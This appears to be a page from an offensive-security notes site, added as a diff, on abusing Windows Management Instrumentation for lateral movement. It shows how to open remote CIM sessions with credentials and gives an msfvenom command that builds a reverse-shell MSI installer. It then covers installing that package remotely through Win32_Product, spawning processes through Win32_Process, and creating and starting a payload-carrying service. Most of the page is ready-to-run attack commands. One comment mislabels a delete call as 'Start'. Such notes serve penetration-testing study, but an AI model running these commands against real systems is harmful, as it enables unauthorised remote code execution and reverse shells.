@@ -1,0 +1,140 @@
+---
+title: WMI
+---
+
+
+import Tabs from '@theme/Tabs';
+import TabItem from '@theme/TabItem';
+
+:::danger Required Privileges: `Administrators`
+
+```batch
+:: Remote Procedure Call
+135/TCP 49152-65535/TCP (DCE/RPC)
+
+:: WinRM 2.0 [HTTP]     WinRM 2.0 [HTTPS]
+5985/TCP                5986/TCP
+```
+
+:::
+
+**`Windows Management Instrumentation` (WMI)** is Windows implementation of **Web-Based Enterprise Management (WBEM)**, an enterprise standard for accessing management Information across devices. **WMI** allows Administrators to perform Standard Management Tasks that Attackers can abuse to perform Lateral Movement.
+
+
+<br/>
+
+
+### Connecting to WMI From Powershell
+
+
+```powershell
+# Creating a PSCredential Object
+$username = 'USERNAME';
+$password = 'PASSWORD';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+```
+
+
+<br/>
+
+We can establish a **WMI Session** using one of the **Protocols `DCOM - WSMan`**.
+
+
+<Tabs>
+  <TabItem value="one" label="DCOM"> 
+    <p>
+
+**`DCOM:`** **RPC** over **IP** will be used for Connecting to WMI. This protocol uses port **135/TCP** and ports **49152-65535/TCP** 
+
+```powershell
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
+```
+
+</p>
+  </TabItem>
+  <TabItem value="two" label="WSMan">
+    <p>
+
+**`WSMan:`** **WinRM** will be used for connecting to **WMI**. This protocol uses ports **5985/TCP (WinRM HTTP)** or **5986/TCP (WinRM HTTPS)**
+
+```powershell
+$Opt = New-CimSessionOption -Protocol WSMan
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
+```
+
+</p>
+  </TabItem>
+</Tabs>
+
+
+<br/>
+<br/>
+
+### Installing MSI Packages
+
+
+
+**`MSI`** is a file format used for Installers. If we can copy an **MSI Package** to the Target System, we can then use **WMI** to attempt to install it for us. Once the **MSI** file is in the Target System, we can attempt to Install it by invoking the **`Win32_Product`** class through WMI.
+
+<br/>
+
+```batch
+:: PAYLOAD
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > INSTALLER.msi
+```
+
+```powershell
+# [WMI Session] Must be Established Before Running the Command
+# Provide [INSTALLER.msi] Location
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\INSTALLER.msi"; Options = ""; AllUsers = $false}
+```
+
+<br/>
+<br/>
+
+### Remote `Process` Creation
+
+We can Remotely Spawn a Process from Powershell by leveraging **Windows Management Instrumentation (WMI)** sending a **WMI** request to the **Win32_Process** class to Spawn the Process under the **`WMI Session`**.
+
+
+```powershell
+$Command = "Command To Run";
+```
+
+```powershell
+# [WMI Session] Must be Established Before Running the Command
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+CommandLine = $Command
+}
+```
+
+<br/>
+
+### Remote `Service` Creation
+
+
+```powershell
+# Set [Service Name] [PAYLOAD] 
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
+Name = "ServiceName";
+DisplayName = "ServiceName";
+PathName = "Command To Run";
+ServiceType = [byte]::Parse("16");
+StartMode = "Manual"
+}
+```
+
+
+```powershell
+# Run
+$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'ServiceName'"
+Invoke-CimMethod -InputObject $Service -MethodName StartService
+
+# Stop
+Invoke-CimMethod -InputObject $Service -MethodName StopService
+
+# Start
+Invoke-CimMethod -InputObject $Service -MethodName Delete
+```
